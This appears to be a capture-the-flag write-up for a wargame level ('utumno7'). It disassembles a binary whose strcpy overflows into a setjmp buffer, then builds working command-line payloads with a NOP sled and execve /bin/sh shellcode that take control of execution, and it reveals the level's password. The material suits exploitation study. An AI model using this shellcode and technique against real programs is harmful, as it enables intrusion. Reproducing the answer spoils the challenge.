Dump of assembler code for function main:
```assembly
   0x08048501 <+0>:	push   ebp
   0x08048502 <+1>:	mov    ebp,esp
   0x08048504 <+3>:	cmp    DWORD PTR [ebp+0x8],0x1		#argc
   0x08048508 <+7>:	jg     0x8048511 <main+16>		#if more than 1 arg
   0x0804850a <+9>:	push   0x1
   0x0804850c <+11>:	call   0x8048380 <exit@plt>
   0x08048511 <+16>:	push   0x80485d0
   0x08048516 <+21>:	call   0x8048370 <puts@plt>		#displays some message
   0x0804851b <+26>:	add    esp,0x4
   0x0804851e <+29>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048521 <+32>:	add    eax,0x4
   0x08048524 <+35>:	mov    eax,DWORD PTR [eax]		#get arg1
   0x08048526 <+37>:	push   eax
   0x08048527 <+38>:	call   0x80484ab <vuln>			#call vuln function
   0x0804852c <+43>:	add    esp,0x4
   0x0804852f <+46>:	mov    eax,0x0
   0x08048534 <+51>:	leave  
   0x08048535 <+52>:	ret
```
Dump of assembler code for function vuln:
```assembly
   0x080484ab <+0>:	push   ebp
   0x080484ac <+1>:	mov    ebp,esp
   0x080484ae <+3>:	sub    esp,0x120
   0x080484b4 <+9>:	mov    DWORD PTR [ebp-0x4],0x0
   0x080484bb <+16>:	lea    eax,[ebp-0xa0]
   0x080484c1 <+22>:	mov    ds:0x8049868,eax
   0x080484c6 <+27>:	lea    eax,[ebp-0xa0]
   0x080484cc <+33>:	push   eax				#vulnrable buffer
   0x080484cd <+34>:	call   0x8048350 <_setjmp@plt>		#setjmp is used to store all env vars
   0x080484d2 <+39>:	add    esp,0x4				#in buffer: [ebp-0xa0]
   0x080484d5 <+42>:	mov    DWORD PTR [ebp-0x4],eax
   0x080484d8 <+45>:	cmp    DWORD PTR [ebp-0x4],0x0
   0x080484dc <+49>:	jne    0x80484fa <vuln+79>
   0x080484de <+51>:	push   DWORD PTR [ebp+0x8]
   0x080484e1 <+54>:	lea    eax,[ebp-0x120]
   0x080484e7 <+60>:	push   eax
   0x080484e8 <+61>:	call   0x8048360 <strcpy@plt>		#strcpy of arg1 addr to ebp-120
   0x080484ed <+66>:	add    esp,0x8				#we can overflow this
   0x080484f0 <+69>:	push   0x17
   0x080484f2 <+71>:	call   0x8048536 <jmp>			#jmp is used to restore all env vars
   0x080484f7 <+76>:	add    esp,0x4				#stored by setjmp
   0x080484fa <+79>:	mov    eax,0x0
   0x080484ff <+84>:	leave  
   0x08048500 <+85>:	ret
```
looking up setjmp vulnrbilities I see:
Calling setjmp saves the program environment into the buffer passed into the call. Later calling longjmp returns execution to the point at which setjmp was called and restores the context that was saved into the buffer. But the values of non-volatile local variables after longjmp are indeterminate. Additionally invoking longjmp from a nested signal handler is undefined, as is longjmping back to a method that has already completed execution

because we copy arg1 to [ebp-0x120] we can try to overwrite what was written by setjmp...
we must use at least 0x120-0xa0 = 128 to make it work. trying...
when running: r $(python -c 'print "A"*140 + "BBBB"')
we get an error because somehow ebp, esp were changed...
after some digging around: it seems like after jmp, some of the registers are full with "A"'s
and ebp is full with B's (plus 0x8)
we can put instead our buffer address!

(gdb) r $(python -c 'print "A"*140+"\x10\xd8\xff\xff"')
Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()

r $(python -c 'print "A"*3+"\x90"*50+"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"+"\x90"*66+"\x10\xd8\xff\xff"')

Program received signal SIGSEGV, Segmentation fault.
0x90909090 in ?? ()

were in control of ebp, and [ebp+4] => eip so we put in:
r $(python -c 'print "AAAA"+"\x40\xd8\xff\xff"+"\x90"*111+"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"+"\x0d\xd8\xff\xff"')
and we got shell

try:
./utumno7 $(python -c 'print "AAAA"+"\x60\xd8\xff\xff"+"\x90"*111+"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"+"\x2a\xd8\xff\xff"')
we get:
jaeyeetiav


